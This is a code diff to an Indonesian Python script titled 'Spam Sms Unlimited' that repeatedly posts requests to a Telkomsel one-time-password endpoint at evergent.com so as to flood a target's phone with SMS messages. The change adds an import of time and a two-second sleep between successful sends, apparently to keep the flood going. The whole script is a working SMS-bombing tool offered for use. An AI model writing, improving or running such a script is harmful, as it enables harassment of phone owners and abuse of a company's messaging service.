@@ -2,6 +2,10 @@ import requests,json,os
 import colorama
 from colorama import Fore
 
+
+
+import time
+
 k = 0
 os.system("clear")
 print("Spam Sms Unlimited ( Tak Terbatas )")
@@ -36,6 +40,7 @@ for i in range(jumlah):
   k += 1
   pos = requests.post("https://hbounify-prod.evergent.com/telkomsel/send-otp",headers=headers,data=data).text
   if "1" in pos:
+    time.sleep(2)
     print("Spam Sms Berhasil Ke",k)
   else:
     print("Spam Sms Gagal Ke",k)
